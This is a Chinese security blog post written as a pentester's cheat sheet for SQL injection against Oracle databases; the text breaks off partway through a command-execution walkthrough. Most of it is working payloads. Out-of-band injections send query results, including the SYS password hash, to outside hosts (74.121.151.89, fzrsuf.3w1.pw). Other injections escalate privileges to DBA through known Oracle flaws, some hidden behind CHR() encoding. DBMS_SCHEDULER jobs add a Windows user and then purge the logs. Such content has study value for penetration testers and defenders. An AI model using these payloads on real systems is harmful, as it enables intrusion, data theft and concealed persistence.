@@ -1,0 +1,774 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <title>hacking-oracle</title>
+  <meta name="description" content="0x0 前言 0x1 信息探测 0x2 命令执行 0x3 实战0x0 前言  在乙方做渗透测试的时候，经常会遇到oracle数据库的注入，这里是针对oracle数据库进行sql注入一系列总结，其中绝大大多数知识都是跟着各位大哥或者前辈学来，感谢他们的分享。 测试数据库如下：  ORACLE DATABASE 10...">
+  <meta name="author" content="leopardpan">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="hacking-oracle">
+  <meta name="twitter:description" content="0x0 前言 0x1 信息探测 0x2 命令执行 0x3 实战0x0 前言  在乙方做渗透测试的时候，经常会遇到oracle数据库的注入，这里是针对oracle数据库进行sql注入一系列总结，其中绝大大多数知识都是跟着各位大哥或者前辈学来，感谢他们的分享。 测试数据库如下：  ORACLE DATABASE 10...">
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="hacking-oracle">
+  <meta property="og:description" content="0x0 前言 0x1 信息探测 0x2 命令执行 0x3 实战0x0 前言  在乙方做渗透测试的时候，经常会遇到oracle数据库的注入，这里是针对oracle数据库进行sql注入一系列总结，其中绝大大多数知识都是跟着各位大哥或者前辈学来，感谢他们的分享。 测试数据库如下：  ORACLE DATABASE 10...">
+  
+  <link rel="icon" type="image/png" href="/images/favicon.png" />
+  <link href="/images/favicon.png" rel="shortcut icon" type="image/png">
+  
+  <link rel="stylesheet" href="/css/main.css">
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="canonical" href="http://localhost:4000/2018/06/hacking-oracle/">
+  <link rel="alternate" type="application/rss+xml" title="whynot" href="http://localhost:4000/feed.xml">
+  
+  <meta name="google-site-verification" content="1-1ZlHoRvM0T2FqPbW2S-qLgYXN6rsn52kErlMPd_gw" />
+
+<!-- 站点统计 -->
+  <script 
+  async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+  </script>  
+
+<!-- 百度统计 -->
+  
+  <script>
+      var _hmt = _hmt || [];
+      (function() {
+        var hm = document.createElement("script");
+        hm.src = "//hm.baidu.com/hm.js?7e193e944675994f2e720fe92e3b32f1";
+        var s = document.getElementsByTagName("script")[0]; 
+        s.parentNode.insertBefore(hm, s);
+      })();
+  </script>
+  
+
+<!-- google 统计 -->
+  
+  <script>
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+          (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+      ga('create', 'UA-120601257-1', 'auto');
+      ga('send', 'pageview');
+  </script>
+  
+
+  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+  (adsbygoogle = window.adsbygoogle || []).push({
+    google_ad_client: "ca-pub-9005224472374751",
+    enable_page_level_ads: true
+  });
+</script>
+
+</head>
+
+
+  <body>
+
+    <span class="mobile btn-mobile-menu">        
+      <div class="nav_container">
+         <nav class="nav-menu-item" style = "float:right">
+            <i class="nav-menu-item">
+              <a href="/#blog" title="" class="blog-button">  博客主页
+              </a>
+            </i>
+            
+                <i class="nav-menu-item">
+
+                  <a href="/archive" title="archive" class="btn-mobile-menu__icon">
+                      所有文章
+                  </a>
+                </i>
+            
+                <i class="nav-menu-item">
+
+                  <a href="/tags" title="tags" class="btn-mobile-menu__icon">
+                      标签
+                  </a>
+                </i>
+            
+                <i class="nav-menu-item">
+
+                  <a href="/about" title="about" class="btn-mobile-menu__icon">
+                      关于我
+                  </a>
+                </i>
+            
+          </nav>
+      </div>
+    </span>
+    
+    <header class="panel-cover panel-cover--collapsed" style="background-image: url('/images/background-cover.jpg')">
+  <div class="panel-main">
+
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+        <!-- 头像效果-start -->
+        <div class="ih-item circle effect right_to_left">            
+            <a href="/#blog" title="前往 whynot 的主页" class="blog-button">
+                <div class="img"><img src="/images/avatar.jpg" alt="img"></div>
+                <div class="info">
+                    <div class="info-back">
+                        <h2> 
+                            
+                                whynotke
+                            
+                        </h2>
+                        <p>
+                           
+                                web / sec
+                            
+                        </p>
+                    </div>
+                </div>
+            </a>
+        </div>
+        <!-- 头像效果-end -->
+        <h1 class="panel-cover__title panel-title"><a href="/#blog" title="link to homepage for whynot" class="blog-button">whynot</a></h1>
+        
+        <span class="panel-cover__subtitle panel-subtitle">web sec</span>
+        
+        <hr class="panel-cover__divider" />
+        <p class="panel-cover__description">欢迎来到我的博客~</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+        
+        
+
+        <div class="navigation-wrapper">
+          <div>
+            <nav class="cover-navigation cover-navigation--primary">
+              <ul class="navigation">
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">博客主页</a></li>
+                
+                  <li class="navigation__item"><a href="/archive" title="archive">所有文章</a></li>
+                
+                  <li class="navigation__item"><a href="/tags" title="tags">标签</a></li>
+                
+                  <li class="navigation__item"><a href="/about" title="about">关于我</a></li>
+                
+              </ul>
+            </nav>
+          </div>          
+        </div>
+
+
+        </div>
+      </div>
+    </div>
+    
+    
+    <div class="panel-cover--overlay cover-clear"></div>
+    
+  </div>
+</header>
+
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner">
+            <article class="post-container post-container--single" itemscope itemtype="http://schema.org/BlogPosting">
+  <header class="post-header">
+    <h1 class="post-title">hacking-oracle</h1>
+    <div class="post-meta">
+      <img src="/images/calendar.png" width="20px"/> 
+      <time datetime="2018-06-19 00:00:00 +0800" itemprop="datePublished" class="post-meta__date date">2018-06-19</time>  
+         
+      <span id="busuanzi_container_page_pv"> | 阅读：<span id="busuanzi_value_page_pv"></span>次</span>
+    </p>
+    </div>
+  </header>
+
+  <section class="post">
+    <p>0x0 前言 
+0x1 信息探测 
+0x2 命令执行 
+0x3 实战</p>
+<h3 id="0x0-前言">0x0 前言</h3>
+<hr />
+<p>  在乙方做渗透测试的时候，经常会遇到oracle数据库的注入，这里是针对oracle数据库进行sql注入一系列总结，其中绝大大多数知识都是跟着各位大哥或者前辈学来，感谢他们的分享。 <br />
+测试数据库如下：  <br />
+ORACLE DATABASE 10G ENTERPRISE EDITION RELEASE 10.2.0.1.0 <br />
+Oracle Database 11g Express Edition Release 11.2.0.2.0.<br />
+Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit<br />
+Oracle Database 10g Enterprise Edition Release 10.2.0.3.0  <br />
+以下所说的10g默认为10.2.0.3.0 11g默认为11.2.0.1.0</p>
+<h3 id="0x1-信息探测">0x1 信息探测</h3>
+<ul>
+  <li>SQL</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select user from dual #当前用户
+SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';   #oracle版本
+select wmsys.wm_concat(granted_role) from user_role_privs-- 看赋予角色权限
+select instance_name from v$instance#服务器sid 远程链接需要
+select utl_inaddr.get_host_name('127.0.0.1') from dual; #查询内网hostname win08dc.contoso.com
+SELECT UTL_HTTP.REQUEST('http://localhost') FROM dual;  #对外通信
+SELECT UTL_INADDR.get_host_address('localhost.com') FROM dual;
+select table_name from user_tables where lower(table_name)='books'   #查看books表书否存在
+</code></pre></div></div>
+<ul>
+  <li>Error Based(报错注入)</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(10g or 11g)
+' and 1 = ctxsys.drithsx.sn(1,(select user from dual))--  
+and 1=(dbms_utility.sqlid_to_sqlhash((select banner from sys.v_$version where rownum=1))) and 1=1. 
+' and 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(122)||CHR(120)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4113=4113) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(107)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL)--  
+' and dbms_xdb_version.checkin((select user from dual))='1'--  
+' and dbms_xdb_version.makeversioned((select user from dual))='1'--  
+' and dbms_utility.sqlid_to_sqlhash((select user from dual))='1'--  
+' and dbms_utility.sqlid_to_sqlhash((select user from dual))='1'--  
+' and 1=(select decode(substr(user,1,1),'S',(1/0),0) from dual)--     #user第一位是S ORA-01476: divisor is equal to zero 
+' order by (SELECT (CASE WHEN (2434=2434||utl_inaddr.get_host_name((select banner from v$version where rownum=1))) THEN 2434 ELSE CAST(1 AS INT)/0 END) FROM DUAL)--%'  
+
+11g普通用户不能用的#utl_inaddr not work maybe acl(11g normal user) or java not installed etc
+'||utl_inaddr.get_host_address((select banner from v$version where rownum=1))||'    
+'||utl_inaddr.get_host_name((select banner from v$version where rownum=1))||'
+
+10g不能用的
+' and dbms_aw_xml.readawmetadata((select sys_context('USERENV', 'SESSION_USER') from dual), null) is null --    #(11g 10g报错ORA-29532: Java call terminated by uncaught Java exception: java.lang.OutOfMemoryError)
+' or dbMS_aW_xMl.reAdaWmetaData((select sYS_cONtExt('US' || 'ERENV', 'SESS' || 'ION_US' || 'ER') from dUAl), null) is null --# bypass 1
+' and 1=(ordsys.ord_dicom.getmappingxpath((select user from dual),user,user))-- 
+</code></pre></div></div>
+<ul>
+  <li>Boolean-based blind(boolean型盲注)</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' and  1=(1) and substr(user,0,1)='Z
+' and length(user)=6-- length('a')=1-- length(1111)=4
+name=admin adm'||case when 1=2 then NULL else 1 end||'in(搜索框也可用)
+'||case when length(sys.database_name)=8 then NULL else 1 end||'
+a%' order by (case when 1=2 then name else 'somthing' end)--    #表达式为真根据id排序为假根据something
+排序不同
+</code></pre></div></div>
+<ul>
+  <li>Union(联合查询)</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' and 1=2 union select NULL,NULL,NULL--
+</code></pre></div></div>
+<ul>
+  <li>Time(时间盲注)</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> order by (case when(1=1) then dbms_pipe.receive_message('ku', 10) else 1 end)
+ ' and 1 = case when substr(user, 1, 1) = 'S' then dbms_pipe.receive_message('ku', 10) else 1 end --
+ ' and 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(117)||CHR(121)||CHR(68)||CHR(74),5)
+ ?id=(SELECT CASE WHEN (NVL(ASCII(SUBSTR(({INJECTION}),1,1)),0) = 100) THEN dbms_pipe.receive_message(('xyz'),14) ELSE dbms_pipe.receive_message(('xyz'),1) END FROM dual)
+</code></pre></div></div>
+<ul>
+  <li>stack query(堆叠查询)</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>oralce不支持堆叠查询，除非你找到能利用PL/SQL的相关函数。#No stacked queries Cannot add ; do something nasty Unless you get really lucky to be injected into PL/SQL*
+</code></pre></div></div>
+<ul>
+  <li>Out of Band(OOB)</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#both 10 and 11g（window无限制）
+select DBMS_LDAP.INIT((select user from dual)||'.fzrsuf.3w1.pw',80) from dual 
+SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.fzrsuf.3w1.pw',80) FROM dual     #获取sys密码
+
+#both 10 and 11g（oracle 11g普通用户有限制)
+SELECT UTL_HTTP.REQUEST('http://74.121.151.89') FROM DUAL;  #get the first 2000 bytes of data 
+select utl_inaddr.get_host_address((select 1234567811 from dual)||'.fzrsuf.3w1.pw') from dual
+
+#all users,8-10g R2
+select httpuritype( 'http://74.121.151.89/123344/back.pl').getclob() from dual; 
+
+#both 10 and 11g（oracle 11g普通用户有限制) 
+(select extractvalue(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % nakut SYSTEM "http://'||(select CHR(51)||CHR(54)||CHR(48) from dual)||'.fzrsuf.3w1.pw/"&gt;%nakut;]&gt;'),'/l') from dual)    
+(select extractvalue(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://74.121.151.89:8888/'||(SELECT user from dual)||'"&gt; %remote;]&gt;'),'/l') from dual)
+(select extractvalue(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://74.121.151.89:8888/'||(select listagg(id||chr(58)||name,',') within group (order by id) from users where rownum&lt;5)||'"&gt; %remote; %param1;]&gt;'),'/l') from dual)    #GET /admin:1,safe:2,test:3 获取前三列 (10g获取报错了)
+
+web下利用
+'||UTL_HTTP.REQUEST('http://74.121.151.89:8888')||'
+'||utl_inaddr.get_host_address((select 1234567811 from dual)||'.fzrsuf.3w1.pw')||'
+'||DBMS_LDAP.INIT((select user from dual)||'.fzrsuf.3w1.pw',80))||'
+
+' and utl_inaddr.get_host_address((select 1234567811 from dual)||'.fzrsuf.3w1.pw')=1--
+' and utl_inaddr.get_host_address((select 3333333 from dual)||'.fzrsuf.3w1.pw') like 1--
+' and UTL_HTTP.REQUEST('http://74.121.151.89:8888')='1'--
+' and DBMS_LDAP.INIT((select user from dual)||'.fzrsuf.3w1.pw',80) is not null--    #后面要加is not null
+
+' and (select extractvalue(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://74.121.151.89:8888/'||(SELECT user from dual)||'"&gt; %remote;]&gt;'),'/l') from dual)||'
+' and 1=(select extractvalue(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://74.121.151.89:8888/'||(SELECT user from dual)||'"&gt; %remote;]&gt;'),'/l') from dual) or '1'='1
+' AND 1=(select extractvalue(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://74.121.151.89:8888/'||(select listagg(id||chr(58)||name,',') within group (order by id) from users where rownum&lt;5)||'"&gt; %remote; %param1;]&gt;'),'/l') from dual)--    #可能会报错 但还是会执行 尽量用一些53 80的端口
+' AND 1=(select extractvalue(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://74.121.151.89:8888/'||(select listagg(id||chr(58)||name,',') within group (order by id) from users where rownum&lt;5)||'"&gt; %remote; %param1;]&gt;'),'/l') from dual)--
+</code></pre></div></div>
+<ul>
+  <li>手工注入</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#查询框注入示例(Boolean)
+name=a%' and (select count(*) from users)&lt;&gt;0 and '%'='   #不等于为&lt;&gt; 返回一样证明users表存在
+name=a%' and (select count(*) from users)&lt;&gt;3 and '%'='  #返回不一样证明users表行数为3
+select count(id) from users   #证明id字段存在
+select count(name) from users   #证明name字段存在
+name=a%' and  (select length(name) from users where id=1)&lt;&gt;5 and '%'='  #返回不一致证明id为1的列name数据长度为5 去掉id=1信息跑其中第一个name长度为5的数据
+name=a%' and  ((select count(*) from users where id=1 and ascii(substr(name,1,1))=97))&lt;&gt;0 and '%'='   #有返回证明第一位字符为a
+name=a%' and  ((select count(*) from users where id=1 and ascii(substr(name,2,1))=100))&lt;&gt;0 and '%'='  #第二位字符为d
+name=a%' and  (select count(*) from users where ascii(substr(name,1.1))&gt;=97)=1 and '%'='    #只有一个用户
+name=a%' and  (select count(*) from users where length(name)=4 and ascii(substr(name,1,1))=115 and ascii(substr(name,2,1))=97)&lt;&gt;0 and '%'='  #不加id如果数据多略微麻烦一点    #多用户跑name为safe 前俩位 不多详解
+
+#报错注入(Error Based)
+select * from user_tab_columns where column_name like '%name%'    #user_table_columns=user_tab_cols
+table_name  column_name data_type
+users   name    VARCHAR2
+test    name    VARCHAR2
+select count(*) from user_tab_columns where column_name like '%name%'   #查询字段中有password到表名 返回行数
+select chr(35)||data||chr(39) from (select rownum as limit,table_name||chr(35)||column_name as data from user_tab_columns where column_name like '%name%') where limit =2    #查看第二条含有列名%name%的表明列名
+name=a%' and  1=(utl_inaddr.get_host_address(((select chr(35)||data||chr(39) from (select rownum as limit,table_name||chr(35)||column_name as data from user_tab_columns where column_name like '%name%') where limit =2)))) and '%'='  #通过报错提取第二行数据
+Warning: oci_execute(): ORA-29257: host #users##name' unknown ORA-06512:  #表明users 列名name
+select chr(126)||chr(39)||data||chr(39)||chr(126) from (selEct rownum as limit,column_name as data from user_tab_columns whEre table_name=CHR(117) || CHR(115) || CHR(101) || CHR(114) || CHR(115)) whEre limit =1    #获取该表第一个列名 CHR(117) || CHR(115) || CHR(101) || CHR(114) || CHR(115))为users编码所得
+name=a%' and  1=(utl_inaddr.get_host_address(((select chr(126)||chr(39)||data||chr(39)||chr(126) from (selEct rownum as limit,column_name as data from user_tab_columns whEre table_name=CHR(117) || CHR(115) || CHR(101) || CHR(114) || CHR(115)) whEre limit =1))))  and '%'='
+Warning: oci_execute(): ORA-29257: host ~'id'~ 
+name=a%' and  1=(utl_inaddr.get_host_address(((select chr(126)||chr(39)||data||chr(39)||chr(126) from (selEct rownum as limit,column_name as data from user_tab_columns whEre table_name=CHR(117) || CHR(115) || CHR(101) || CHR(114) || CHR(115)) whEre limit =2))))  and '%'='
+Warning: oci_execute(): ORA-29257: host ~'name'~ 
+name=a%' and  1=(utl_inaddr.get_host_address((Select chr(126)||chr(39)||data||chr(39)||chr(126) from (selEct rownum as limit,id||chr(35)||NAME as data from users) where limit=1)))  and '%'='
+Warning: oci_execute(): ORA-29257: host ~'1#admin'~ unknown
+
+'||utl_inaddr.get_host_name((SELECT table_name FROM USER_TAB_COLS WHERE COLUMN_NAME LIKE '%25%32%35F_YHKL%25%32%35' and table_name not like '%25%32%35%25%34%32%25%34%39%25%34%65%25%32%35' and table_name not in ('TBZYDA') and table_name not in('TBCZJZYDA') AND ROWNUM=1))||'   #oracle(还是jsp 忘了)好像可以对url编码自动解码 测试超过三次失败
+
+#批量提取
+'||utl_inaddr.get_host_address((select listagg(id||chr(58)||name,',') within group (order by id) from users where rownum&lt;5))||' #listagg 11g以上提取数据
+select wmsys.wm_concat(id||chr(58)||name) from user     #通用
+</code></pre></div></div>
+<ul>
+  <li>调试信息(本文用到的)</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select * from user_java_policy where grantee_name='SYSTEM'; 查看SYSTEM可用的java权限列表，通过以下命令查看赋权情况 #ORACLE不要用双引号 双引号会被当成字符处理 所以一般用成对的引号 '' '''' ''''''''
+select * from user_objects where OBJECT_NAME='javaexec' #检测包是否创建成功
+select * from user_objects where OBJECT_NAME='JAVACMD'  #检测函数是否存在 函数要么与原先一致要么大写 
+select wmsys.wm_concat(granted_role) from user_role_privs-- 看赋予角色权限
+select text from all_source where name = 'DBMS_EXPORT_EXTENSION' 查询包的源码
+SELECT * FROM ALL_OBJECTS WHERE OBJECT_TYPE IN ('FUNCTION','PROCEDURE','PACKAGE') order by object_id desc; 查询已安装的函数
+删除对应的某个权限 如去除java.io.FilePermission
+begin
+  DBMS_JAVA.DISABLE_PERMISSION(129);
+  dbms_java.delete_permission(129); 
+  commit;
+end;
+删除相关的包类或者函数  #Use the DROP JAVA statement to drop a Java source, class, or resource schema object.
+revoke JAVASYSPRIV from SYSTEM;
+drop JAVA SOURCE "javaexec";
+drop FUNCTION SYSTEM.javacmd;
+drop FUNCTION SYSTEM.myjava;
+drop FUNCTION SYSTEM.myjava1;
+drop FUNCTION SYSTEM.myjava2;
+list all Java related stored objects class
+SELECT object_name,object_type,status,timestamp FROM user_objects WHERE (object_name NOT LIKE 'SYS_%' AND object_name NOT LIKE 'CREATE$%' AND object_name NOT LIKE 'JAVA$%' AND object_name NOT LIKE 'LOADLOB%') AND object_type LIKE 'JAVA %' ORDER BY object_type, object_name;
+'1'=utl_inaddr.get_host_name((select count(*) from user_objects where OBJECT_NAME='SasugaOracle'))--    #使用web调试
+sqlplus /nolog  #登陆本机
+</code></pre></div></div>
+<h3 id="0x2-命令执行">0x2 命令执行</h3>
+<p>能提dba就提dba 然后grant javasyspriv权限 创建class 创建javacmd 执行命令不能提dba dbms_xmlquery.newcontext赋予其fileio执行权限(10g额外需要write read)</p>
+<ul>
+  <li>提权到dba的几个函数（我就GET_DOMAIN_INDEX_TABLES成功过）</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#创建提权函数
+and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate ''create or replace function pwn return varchar2 authid current_user is PRAGMA autonomous_transaction;BEGIN execute immediate ''''grant dba to TEST'''';commit;return ''''z'''';END; ''; commit; end;') from dual) is not null --
+
+使用SYS.LT.CREATEWORKSPACE提权 9iR2, 10gR1, 10gR2 and 11gR1     #fixed 2009.7
+and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate ''
+begin SYS.LT.CREATEWORKSPACE(''''A10'''''''' and TEST.pwn()=''''''''x'''');SYS.LT.REMOVEWORKSPA CE(''''A10'''''''' and TEST.pwn()=''''''''x'''');end;''; commit; end;') from dual) is not null --#本地失败
+
+使用sys.dbms_cdc_publish.create_change_set提权 10gR1, 10gR2, 11g R1 and 11gR2   #fixed 2010.10
+select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate '' begin sys.dbms_cdc_publish.create_change_set('''' a'''',''''a'''',''''a''''''''||TEST.pwn()||''''''''a'''',''''Y'''',s ysdate,sysdate);end;''; commit; end;') from dual--#本地失败
+
+使用GET_DOMAIN_INDEX_TABLES Oracle 8.1.7.4, 9.2.0.1 - 9.2.0.7, 10.1.0.2 - 10.1.0.4, 10.2.0.1-10.2.0.2
+' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('foo','bar','DBMS_OUTPUT".PUT_LINE(:P1); EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION; BEGIN EXECUTE IMMEDIATE ''''grant dba to TEST''''; END;''; END;--', '', 0, '1', 0) from dual)=0--#注 10.2.0.1测试成功
+</code></pre></div></div>
+<ul>
+  <li>11g dba权限下直接执行命令    #测试数据库</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PL/SQL如下:
+begin
+DBMS_SCHEDULER.create_program('myprog11','EXECUTABLE','net user pwned pwn3d!! /add',0,TRUE);
+DBMS_SCHEDULER.create_job(job_name=&gt;'myjob11',program_name=&gt;'myprog11',
+start_date=&gt;NULL,repeat_interval=&gt;NULL,end_date=&gt;NULL,enabled=&gt;TRUE,auto_drop=&gt;TRUE);
+dbms_lock.sleep(1);
+dbms_scheduler.drop_program(program_name=&gt;'myprog11');
+dbms_scheduler.purge_log;
+end;
+#sql injection如下：
+' and (select SYS.KUPP$PROC.CREATE_MASTER_PROCESS('DBMS_SCHEDULER.create_program(''myprog10'',''EXECUTABLE'',''net user pwnedfromweb pwn3d!! /add'',0,TRUE);DBMS_SCHEDULER.create_job(job_name=&gt;''myjob10'',program_name=&gt;''myprog10'',start_date=&gt;NULL,repeat_interval=&gt;NULL,end_date=&gt;NULL,enabled=&gt;TRUE,auto_drop=&gt;TRUE);dbms_lock.sleep(1);dbms_scheduler.drop_program(program_name=&gt;''myprog10'');dbms_scheduler.purge_log;')from dual) is not null --
+Oracle Database 11g Express Edition Release 11.2.0.2.0 – Production #测试失败
+Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit Production    #测试失败
+
+参考文章
+https://www.notsosecure.com/hacking-oracle-xe-from-web/
+</code></pre></div></div>
+<ul>
+  <li>dba下赋予相关权限</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#only be executed by SYS.Affected Systems:8,9,10g R1,R2,11gR1
+(Select DBMS_REPCAT_RPC.VALIDATE_REMOTE_RC(USER,'VALIDATE_GRP_OBJECTS_LOCAL(:canon_gname); execute immediate ''declare pragma autonomous_transaction;begin execute immediate ''''grant dba to aaaa'''';end;''; end;--','CCCC') from dual) is not null-- 
+(select DBMS_REPCAT_RPC.VALIDATE_REMOTE_RC(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(44)||CHR(86)||CHR(65)||CHR(76)||CHR(73)||CHR(68)||CHR(65)||CHR(84)||CHR(69)||CHR(95)||CHR(71)||CHR(82)||CHR(80)||CHR(95)||CHR(79)||CHR(66)||CHR(74)||CHR(69)||CHR(67)||CHR(84)||CHR(83)||CHR(95)||CHR(76)||CHR(79)||CHR(67)||CHR(65)||CHR(76)||CHR(40)||CHR(58)||CHR(99)||CHR(97)||CHR(110)||CHR(111)||CHR(110)||CHR(95)||CHR(103)||CHR(110)||CHR(97)||CHR(109)||CHR(101)||CHR(41)||CHR(59)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(100)||CHR(101)||CHR(99)||CHR(108)||CHR(97)||CHR(114)||CHR(101)||CHR(32)||CHR(112)||CHR(114)||CHR(97)||CHR(103)||CHR(109)||CHR(97)||CHR(32)||CHR(97)||CHR(117)||CHR(116)||CHR(111)||CHR(110)||CHR(111)||CHR(109)||CHR(111)||CHR(117)||CHR(115)||CHR(95)||CHR(116)||CHR(114)||CHR(97)||CHR(110)||CHR(115)||CHR(97)||CHR(99)||CHR(116)||CHR(105)||CHR(111)||CHR(110)||CHR(59)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(39)||CHR(103)||CHR(114)||CHR(97)||CHR(110)||CHR(116)||CHR(32)||CHR(100)||CHR(98)||CHR(97)||CHR(32)||CHR(116)||CHR(111)||CHR(32)||CHR(97)||CHR(97)||CHR(97)||CHR(97)||CHR(39)||CHR(39)||CHR(59)||CHR(101)||CHR(110)||CHR(100)||CHR(59)||CHR(39)||CHR(59)||CHR(32)||CHR(101)||CHR(110)||CHR(100)||CHR(59)||CHR(45)||CHR(45)||CHR(44)||CHR(67)||CHR(67)||CHR(67)||CHR(67))from dual) is not null--
+
+Only DBA can call this function
+(select SYS.KUPP$PROC.CREATE_MASTER_PROCESS(begin execute immediate 'grant javasyspriv to SYSTEM';end;)from dual) is not null   
+' AND (select SYS.KUPP$PROC.CREATE_MASTER_PROCESS(CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(103)||CHR(114)||CHR(97)||CHR(110)||CHR(116)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(115)||CHR(121)||CHR(115)||CHR(112)||CHR(114)||CHR(105)||CHR(118)||CHR(32)||CHR(116)||CHR(111)||CHR(32)||CHR(83)||CHR(89)||CHR(83)||CHR(84)||CHR(69)||CHR(77)||CHR(39)||CHR(59)||CHR(101)||CHR(110)||CHR(100)||CHR(59))from dual) is not null-- 
+
+参考文章
+http://www.nocoug.org/download/2013-02/NoCOUG_201302_Slavik_Markovich_SQL_Injection_in_Web_Applications.pdf
+https://media.blackhat.com/bh-us-10/whitepapers/Siddharth/BlackHat-USA-2010-Siddharth-Hacking-Oracle-from-the-Web-wp.pdf
+</code></pre></div></div>
+<ul>
+  <li>命令执行</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. hacking 10g  Oracle 8.1.7.4, 9.2.0.1 - 9.2.0.7, 10.1.0.2 - 10.1.0.4, 10.2.0.1-10.2.0.2
+ORACLE DATABASE 10G ENTERPRISE EDITION RELEASE 10.2.0.1.0（该版本虚拟机丢失 之前测试成功)
+1. 提升TEST用户到dba权限    TEST用户名要大写
+' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('foo','bar','DBMS_OUTPUT".PUT_LINE(:P1); EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION; BEGIN EXECUTE IMMEDIATE ''''grant dba to TEST''''; END;''; END;--', '', 0, '1', 0) from dual)=0--
+2. 创建Java包
